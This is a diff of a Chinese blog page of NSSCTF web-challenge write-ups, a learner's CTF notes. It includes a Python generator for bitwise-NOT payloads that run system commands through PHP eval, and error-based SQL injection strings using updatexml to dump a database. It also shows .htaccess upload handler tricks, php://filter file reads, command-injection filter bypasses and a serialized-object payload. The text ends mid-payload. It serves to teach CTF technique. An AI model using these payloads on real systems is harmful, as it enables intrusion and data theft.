@@ -128,6 +128,13 @@
 <li><a href="#19_suctf-2019easysql-sql%E6%B3%A8%E5%85%A5-sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5">19_[suctf 2019]EasySQL –SQL注入 –SQL注入类型 –堆叠注入</a></li>
 <li><a href="#22_zjctf-2019nizhuansiwei-php%E4%BC%AA%E5%8D%8F%E8%AE%AE-file_get_contents-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-preg_match-%E6%9C%89%E9%97%AE%E9%A2%98%E5%B0%9A%E6%9C%AA%E8%A7%A3%E5%86%B3">22_[ZJCTF 2019]NiZhuanSiWei –PHP伪协议 –file_get_contents() –反序列化 –preg_match() –有问题尚未解决</a></li>
 <li><a href="#1096_gxyctf-2019ping-ping-ping-ping%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87-flag%E5%AD%97%E4%B8%B2%E7%BB%95%E8%BF%87">1096_[GXYCTF 2019]Ping Ping Ping –ping命令注入 –空格绕过 –flag字串绕过</a></li>
+<li><a href="#439_swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bhardrce-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0-preg_match%E7%BB%95%E8%BF%87-url%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87">439_[SWPUCTF 2021 新生赛]hardrce –命令执行函数 –preg_match()绕过 –URL取反绕过</a></li>
+<li><a href="#436_swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Beasyupload30-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-htaccess-%E6%9C%89%E9%97%AE%E9%A2%98%E5%B0%9A%E6%9C%AA%E8%A7%A3%E5%86%B3">436_[SWPUCTF 2021 新生赛]easyupload3.0 –文件上传 –.htaccess –有问题尚未解决</a></li>
+<li><a href="#428_swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Berror-sql%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-flag%E5%88%86%E6%AE%B5%E6%98%BE%E7%A4%BA">428_[SWPUCTF 2021 新生赛]error –SQL注入 –报错注入 –flag分段显示</a></li>
+<li><a href="#3871_litctf-20231zjs-jsfuck%E5%8A%A0%E5%AF%86">3871_[LitCTF 2023]1zjs –JSFuck加密</a></li>
+<li><a href="#2640_swpuctf-2022-%E6%96%B0%E7%94%9F%E8%B5%9Bez_ez_php-php%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E">2640_[SWPUCTF 2022 新生赛]ez_ez_php –PHP伪协议 –文件包含漏洞</a></li>
+<li><a href="#440_swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bpop-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-pop%E9%93%BE-__tostring%E8%B0%83%E7%94%A8%E5%89%8D%E6%8F%90">440_[SWPUCTF 2021 新生赛]pop –反序列化 –pop链 –<code>__toString()</code>调用前提</a></li>
+<li><a href="#3867_litctf-2023%E4%BD%9C%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">3867_[LitCTF 2023]作业管理系统 –文件上传</a></li>
 </ul>
 <!-- tocstop -->
 
@@ -856,7 +863,7 @@
 </tr>
 </tbody></table>
 <p>&emsp;&emsp;这下子明确了，开始对三个参数进行处理</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">text=data://tetx/plain,welcome to the zjctf</span><br><span class="line">file=php://filter/read=convert.base64-encode/resource=useless.php</span><br><span class="line">=&gt; 以下为Base64解码后的useless.php代码</span><br><span class="line">class Flag&#123;  //flag.php</span><br><span class="line">    public $file;</span><br><span class="line">    public function __tostring()&#123;</span><br><span class="line">        if(isset($this-&gt;file))&#123;</span><br><span class="line">            echo file_get_contents($this-&gt;file);</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">=&gt; password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br><span class="line">整合为：</span><br><span class="line">/?text=data://tetx/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">text=data:<span class="comment">//tetx/plain,welcome to the zjctf</span></span><br><span class="line">file=php:<span class="comment">//filter/read=convert.base64-encode/resource=useless.php</span></span><br><span class="line">=&gt; 以下为Base64解码后的useless.php代码</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">=&gt; password=O:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;</span><br><span class="line">整合为：</span><br><span class="line">/?text=data:<span class="comment">//tetx/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
 
 <p>&emsp;&emsp;<strong>枯了，死活出不来，只好去看大佬的WriteUp；诶，也没啥不一样啊，步骤都对啊？哦，file&#x3D;useless.php才行啊？</strong></p>
 <p>&emsp;&emsp;这下才出来flag了，不过我还是不理解这是为什么，留待日后解决；不过也要打个醒，<span style="background-color: yellow;">不是啥参数都是PHP伪协议</span></p>
@@ -869,7 +876,7 @@
 
 <p>&emsp;&emsp;到这里就很刻意了，代码将空格放入了黑名单，而flag.php也在当前目录中，于是想办法绕过空格符即可，直接<code>cat&lt;flag.php</code></p>
 <p>&emsp;&emsp;好吧不止有空格在黑名单中，cat、&lt;、或者flag也在，试试</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;ls&lt;/                       # 空</span><br><span class="line">;flag                       # fxck your flag!</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">;ls&lt;/                       <span class="comment"># 空</span></span><br><span class="line">;flag                       <span class="comment"># fxck your flag!</span></span><br></pre></td></tr></table></figure>
 
 <p>&emsp;&emsp;根据上述尝试，应该是flag被监测了，查找在shell语句中空格的绕过方法</p>
 <table>
@@ -886,7 +893,7 @@
 </thead>
 </table>
 <p>&emsp;&emsp;对上述一一尝试</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;echo&lt;hello</span><br><span class="line">:echo&lt;&gt;hello</span><br><span class="line">;echo$IFS$hello        # OK</span><br><span class="line">;echo$IFS$6hello      # OK</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">;<span class="keyword">echo</span>&lt;hello</span><br><span class="line">:<span class="keyword">echo</span>&lt;&gt;hello</span><br><span class="line">;<span class="keyword">echo</span>$IFS<span class="variable">$hello</span>        <span class="comment"># OK</span></span><br><span class="line">;<span class="keyword">echo</span>$IFS$<span class="number">6</span>hello      <span class="comment"># OK</span></span><br></pre></td></tr></table></figure>
 
 <p>&emsp;&emsp;行，就用<code>$IFS</code>，接下来是flag，不过注意到除了flag还有一个index.php，<code>cat$IFS$index.php</code>康康它，得到黑名单</p>
 <img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/1096_index%E6%9F%A5%E7%9C%8B.png" class title="1096_index查看">
@@ -912,6 +919,262 @@
 </tbody></table>
 <p>&emsp;&emsp;这里取第一种(<strong>注意，这里必须使用带数字的空格替换方式，否则不会出现flag</strong>)作为演示，flag如下</p>
 <img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/1096_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" class title="1096_结果展示">
+
+<h2><span id="439_swpuctf-2021-新生赛hardrce-命令执行函数-preg_match绕过-url取反绕过">439_[SWPUCTF 2021 新生赛]hardrce –命令执行函数 –preg_match()绕过 –URL取反绕过</span></h2><p>&emsp;&emsp;进入环境得到PHP代码，审计得到flag’的要求如下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># GET方式传入参数wllm</span></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line"><span class="comment"># 字符绕过</span></span><br><span class="line"><span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];</span><br><span class="line"><span class="comment"># 不能用字母</span></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>);</span><br><span class="line"><span class="comment"># 命令执行函数</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;这个不能用字母太伤了点，第一时间想到的不应该是满足要求，而是如何绕过，以下为搜索到的preg_match()的常用绕过方法</p>
+<table>
+<thead>
+<tr>
+<th align="center">方式</th>
+<th align="center">做法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">数组绕过</td>
+<td align="center">即令传入的参数为数组：wllm[]&#x3D;~~</td>
+</tr>
+<tr>
+<td align="center">利用PCRE回溯次数限制绕过</td>
+<td align="center">preg_match()的回溯次数默认为1000000次，采用函数str_repeat()强行输入同一字串多次</td>
+</tr>
+<tr>
+<td align="center">换行符绕过</td>
+<td align="center">在参数前面添加换行符%0a：wllm&#x3D;%0a~~</td>
+</tr>
+</tbody></table>
+<p>&emsp;&emsp;由于blacklist中将换行符<code>\n</code>包含，故尝试前两种方法</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?wllm[]=<span class="number">123</span>                               <span class="comment"># NoVic4说：不错哦小伙子，可你能拿到flag吗？</span></span><br><span class="line">/?wllm=<span class="title function_ invoke__">str_repeat</span>(%<span class="number">27</span>a%<span class="number">27</span>,<span class="number">10000000</span>)        <span class="comment"># Ra&#x27;s Al Ghul说不能用字母哦！</span></span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;测试出实际可行的方法为数组绕过，但是eval()函数只接受字符串做参数，故还是需要想办法满足其全部要求</p>
+<p>&emsp;&emsp;经查询，对“无数字、字母”要求的参数输入，有以下几种：取反、异或、自增，有些操作其实PHP代码会跟简单，但谁叫我喜欢Python呢</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 取反</span></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">return_backcode</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="comment"># 将字符串转换为字节</span></span><br><span class="line">    bytes_s = s.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="comment"># 创建一个新的bytes对象来存储按位取反后的结果</span></span><br><span class="line">    <span class="built_in">bytes</span> = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="comment"># 对每个字节进行按位取反，并添加到bytes中</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> bytes_s:</span><br><span class="line">        byte = ~byte &amp; <span class="number">0xFF</span>  <span class="comment"># 按位取反并转换为无符号8位整数</span></span><br><span class="line">        <span class="built_in">bytes</span>.append(byte)</span><br><span class="line">    <span class="comment"># 将按位取反后的字节的十六进制表示编码为URL格式</span></span><br><span class="line">    urlencoded_hex = urllib.parse.quote_plus(<span class="built_in">bytes</span>.<span class="built_in">hex</span>())</span><br><span class="line">    urlencoded_hex =urlencoded_hex.upper()</span><br><span class="line">    <span class="comment"># 转化为最终格式</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(urlencoded_hex):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            result.append(<span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">        result.append(char)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"><span class="comment"># 这里对格式进行了硬编码，必须满足~1(&quot;~2&quot;)的格式，比如system(&quot;pwd&quot;)</span></span><br><span class="line">sample = <span class="built_in">input</span>(<span class="string">&quot;请输入参数：&quot;</span>).strip()</span><br><span class="line">deals = sample.split(<span class="string">&#x27;(&quot;&#x27;</span>)</span><br><span class="line">deals[<span class="number">1</span>] = deals[<span class="number">1</span>][<span class="number">0</span>:<span class="built_in">len</span>(deals[<span class="number">1</span>])-<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(deals)</span><br><span class="line">end = <span class="string">&quot;(~&quot;</span>+return_backcode(deals[<span class="number">0</span>])+<span class="string">&quot;)(~&quot;</span>+return_backcode(deals[<span class="number">1</span>])+<span class="string">&#x27;);&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(end)</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;这个一写完就已经不想动了，直接拿<code>system(&quot;pwd&quot;)</code>试了试，成功！其他的两个就容我下次再学吧(‘-‘*ゞ</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;ls /&quot;</span>)</span><br><span class="line"><span class="comment"># 返回：bin boot dev etc flllllaaaaaaggggggg home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span></span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;一如既往的单纯呐，直接<code>system(&quot;cat /flllllaaaaaaggggggg&quot;)</code>就出来了</p>
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/439_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" class title="439_结果展示">
+
+<h2><span id="436_swpuctf-2021-新生赛easyupload30-文件上传-htaccess-有问题尚未解决">436_[SWPUCTF 2021 新生赛]easyupload3.0 –文件上传 –.htaccess –有问题尚未解决</span></h2><p>&emsp;&emsp;进入环境，发现标签页的提示让我看不懂了，再去查一下文件上传漏洞，发现能够契合提示的上传方式</p>
+<p>&emsp;&emsp;<strong>.htaccess</strong>：是Apache服务器中的一个配置文件，它负责相关目录下的网页配置；通过htaccess文件，可以实现:网页301重定向、自定义404页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能；启动.htaccess，需要在服务器的主配置文件中将AllowOverride设置为All；以下为搜索到的.htaccess文件常见的使用方法</p>
+<table>
+<thead>
+<tr>
+<th align="center">功能描述</th>
+<th align="center"><code>.htaccess</code>配置示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">重定向URL</td>
+<td align="center"><code>Redirect 301 /old-page.html /new-page.html</code></td>
+</tr>
+<tr>
+<td align="center">URL重写</td>
+<td align="center"><code>RewriteEngine On&lt;br&gt;RewriteRule ^products/([0-9]+)$ product.php?id=$1</code></td>
+</tr>
+<tr>
+<td align="center">禁止访问文件或目录</td>
+<td align="center"><code>Deny from all</code></td>
+</tr>
+<tr>
+<td align="center">自定义错误页面</td>
+<td align="center"><code>ErrorDocument 404 /error404.html</code></td>
+</tr>
+<tr>
+<td align="center">访问权限控制</td>
+<td align="center"><code>Order deny,allow&lt;br&gt;Deny from all&lt;br&gt;Allow from 192.168.0.1</code></td>
+</tr>
+<tr>
+<td align="center">设置默认文档</td>
+<td align="center"><code>DirectoryIndex index.php index.html</code></td>
+</tr>
+<tr>
+<td align="center">压缩文件</td>
+<td align="center"><code>&lt;IfModule mod_deflate.c&gt;&lt;br&gt;AddOutputFilterByType DEFLATE text/html text/plain text/xml&lt;br&gt;&lt;/IfModule&gt;</code></td>
+</tr>
+<tr>
+<td align="center">防止目录列表</td>
+<td align="center"><code>Options -Indexes</code></td>
+</tr>
+<tr>
+<td align="center">设置缓存</td>
+<td align="center"><code>&lt;IfModule mod_expires.c&gt;&lt;br&gt;ExpiresActive On&lt;br&gt;ExpiresDefault &quot;access plus 1 week&quot;&lt;br&gt;&lt;/IfModule&gt;</code></td>
+</tr>
+<tr>
+<td align="center">强制使用HTTPS</td>
+<td align="center"><code>RewriteEngine On&lt;br&gt;RewriteCond %&#123;HTTPS&#125; off&lt;br&gt;RewriteRule ^(.*)$ https://%&#123;HTTP_HOST&#125;%&#123;REQUEST_URI&#125; [L,R=301]</code></td>
+</tr>
+<tr>
+<td align="center">配置HTTP身份验证</td>
+<td align="center"><code>AuthType Basic&lt;br&gt;AuthName &quot;Restricted Area&quot;&lt;br&gt;AuthUserFile /path/to/.htpasswd&lt;br&gt;Require valid-user</code></td>
+</tr>
+<tr>
+<td align="center">设置PHP配置</td>
+<td align="center"><code>php_value upload_max_filesize 10M&lt;br&gt;php_value memory_limit 256M</code></td>
+</tr>
+<tr>
+<td align="center">定义自定义错误页面</td>
+<td align="center"><code>ErrorDocument 404 /404.html&lt;br&gt;ErrorDocument 500 /500.html</code></td>
+</tr>
+<tr>
+<td align="center">禁止特定文件类型</td>
+<td align="center">&#96;&lt;FilesMatch “.(php</td>
+</tr>
+<tr>
+<td align="center">设置响应头信息</td>
+<td align="center"><code>&lt;IfModule mod_headers.c&gt;&lt;br&gt;Header set Cache-Control &quot;no-cache, no-store, must-revalidate&quot;&lt;br&gt;Header set Access-Control-Allow-Origin &quot;*&quot;&lt;br&gt;&lt;/IfModule&gt;</code></td>
+</tr>
+<tr>
+<td align="center">配置URL重定向规则</td>
+<td align="center"><code>RewriteEngine On&lt;br&gt;RewriteRule ^news/([0-9]+)/?$ article.php?id=$1 [L]</code></td>
+</tr>
+<tr>
+<td align="center">设置URL重定向和查询字符串处理</td>
+<td align="center"><code>RewriteEngine On&lt;br&gt;&lt;br&gt;# Redirect &quot;/about&quot; to &quot;/pages/about&quot;&lt;br&gt;RewriteRule ^about$ /pages/about [L,R=301]&lt;br&gt;&lt;br&gt;# Rewrite &quot;/product?id=123&quot; to &quot;/product/123&quot;&lt;br&gt;RewriteCond %&#123;QUERY_STRING&#125; ^id=(\d+)$&lt;br&gt;RewriteRule ^product$ /product/%1 [L,R=301]</code></td>
+</tr>
+<tr>
+<td align="center">自定义目录索引</td>
+<td align="center"><code>Options +Indexes&lt;br&gt;IndexOptions FancyIndexing</code></td>
+</tr>
+</tbody></table>
+<p>&emsp;&emsp;上述仅为知识普及，这里才是解题需要学习的.htaccess的编写，先传一个.php文件试试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=&quot;shangchuan.php&quot;                   # 被挡</span><br><span class="line">filename=&quot;shangchuan.phtml&quot;                 # 被挡</span><br><span class="line">filename=&quot;shangchuan.jpg&quot;                   # 通过，展示为图片</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;初步认为网页只允许.jpg后缀的文件上传，于是创建.htaccess文件并实现.jpg文件以.php脚本的方式运行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;436_shangchuan.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FileMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;于是先上传.htaccess文件，退回后再上传.jpg文件，？？？</p>
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/436_%E5%87%BA%E9%94%99%E5%B1%95%E7%A4%BA.png" class title="436_出错展示">
+
+<p>&emsp;&emsp;回过头看佬们的WriteUp，也是一样的啊，我还是没找出来哪里的错</p>
+<p>&emsp;&emsp;又试了一次，这次又不一样了，是我没有绕过去嘛，，，</p>
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/436_%E6%8B%A6%E6%88%AA%E5%B1%95%E7%A4%BA.png" class title="436_拦截展示">
+
+<h2><span id="428_swpuctf-2021-新生赛error-sql注入-报错注入-flag分段显示">428_[SWPUCTF 2021 新生赛]error –SQL注入 –报错注入 –flag分段显示</span></h2><p>&emsp;&emsp;进入环境，尝试向框中输入随机字符乱码，出现提示</p>
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/428_SQL%E6%8F%90%E7%A4%BA.png" class title="428_SQL提示">
+
+<p>&emsp;&emsp;明确是SQL注入知识点，按照19记载的各种类型进行尝试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2-1                              # 2-1</span><br><span class="line">1&#x27; and 1=1                       # 没用</span><br><span class="line">1&#x27; order by 1 --+                # 没用</span><br><span class="line">1;select 1,2                     # 没用</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;很显然二次注入也不能是，只能是报错注入了，查了查报错注入的常用语句及函数</p>
+<table>
+<thead>
+<tr>
+<th align="center">函数</th>
+<th>参数释义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>updatexml(XML_document, XPath_string,new_value);</code></td>
+<td>XML_document：String格式，为XML文档对象的名称<br>XPath_string：Xpath语法的查询语句<br>new_value：String格式，替换查找到的数据</td>
+</tr>
+<tr>
+<td align="center"><code>extractValue(XML_document, XPath_string);</code></td>
+<td>XML_document：String格式，为XML文档对象的名称<br>XPath_string：Xpath语法的查询语句</td>
+</tr>
+</tbody></table>
+<p>&emsp;&emsp;先尝试使用函数updatexml()，由于需要使其报错、不修改原有数据库且随报错输出查询语句的结果，故参数1、3应当被忽略，以1代替；而为了能很好的在报错信息中找到关键输出，会使用concat函数以两个特殊符号将查询结果包围</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 爆数据库</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#           =&gt; test_db</span><br><span class="line">// 爆表名</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;test_db&#x27;),0x7e),1)#                                      =&gt; test_tb users</span><br><span class="line">// 爆字段名</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;test_db&#x27; and table_name=&#x27;test_tb&#x27;),0x7e),1)#             =&gt; id flag</span><br><span class="line">// 爆flag</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select flag from test_tb),0x7e),1)#    =&gt;NSSCTF&#123;b54f13c8-a82f-48a6-85ad</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;明显出现问题，flag只爆了一半出来，查阅得知原因是因为flag过长导致无法显示完全，使用substr()函数可以解决</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr((select flag from test_tb),21,40)           // 查询flag字段，查询范围为第21~40个字符</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,substr((select flag from test_tb),21,40),0x7e),1)#</span><br><span class="line">=&gt; -48a6-85ad-16550bc50df6&#125;</span><br><span class="line">// 整合后应如下：NSSCTF&#123;b54f13c8-a82f-48a6-85ad-16550bc50df6&#125;</span><br></pre></td></tr></table></figure>
+
+<h2><span id="3871_litctf-20231zjs-jsfuck加密">3871_[LitCTF 2023]1zjs –JSFuck加密</span></h2><p>&emsp;&emsp;进入环境，又是巨多JS源码中找flag，不过这次下手轻了点，不需要往下翻就能看到</p>
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/3871_%E5%85%B3%E9%94%AE%E6%8F%90%E7%A4%BA.png" class title="3871_关键提示">
+
+<p>&emsp;&emsp;进入提示文件，(* ￣︿￣)这是啥，问了文心一言，叫做JSFuck加密，解密只需要把密文复制后放到控制台console中输出即可</p>
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/3871_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" class title="3871_结果展示">
+
+<h2><span id="2640_swpuctf-2022-新生赛ez_ez_php-php伪协议-文件包含漏洞">2640_[SWPUCTF 2022 新生赛]ez_ez_php –PHP伪协议 –文件包含漏洞</span></h2><p>&emsp;&emsp;进入环境得到PHP代码，审计代码发现如下关键处</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># GET方式传入参数</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line"><span class="comment"># 参数file的前三个字符须为“php”</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="number">0</span>, <span class="number">3</span>) === <span class="string">&quot;php&quot;</span> )</span><br><span class="line"><span class="comment"># 文件包含</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="comment"># 关键文件提示</span></span><br><span class="line"><span class="comment">//flag.php</span></span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;手拿把掐，直接利用PHP伪协议·<code>php://filter/read=convert.base64-encode/resource=flag.php</code>，得到Base64加密的flag</p>
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/2640_%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81.png" class title="2640_编码解码">
+
+<p>&emsp;&emsp;根据提示，目标文件名应当是flag，尝试直接在URL后加上&#x2F;flag，出现答案</p>
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/2640_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" class title="2640_结果展示">
+
+<p>&emsp;&emsp;回头看WriteUp的时候，发现也可以二次使用PHP伪协议，令resource&#x3D;flag即可</p>
+<h2><span id="440_swpuctf-2021-新生赛pop-反序列化-pop链-__tostring调用前提">440_[SWPUCTF 2021 新生赛]pop –反序列化 –pop链 –<code>__toString()</code>调用前提</span></h2><p>&emsp;&emsp;进入环境，明确知识点为反序列化，需要传入参数w00m，尝试构造类w44m的序列化代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?w00m=O:<span class="number">4</span>:<span class="string">&quot;w44m&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;\x00w440\x00admin&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;w44m&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;\x00*\x00passwd&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;08067&quot;</span>;&#125;</span><br><span class="line">/?w00m=O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>w44m%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>w44m%<span class="number">00</span>admin%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>w44m%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>passwd%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">2208067</span>%<span class="number">22</span>%<span class="number">3</span>B%<span 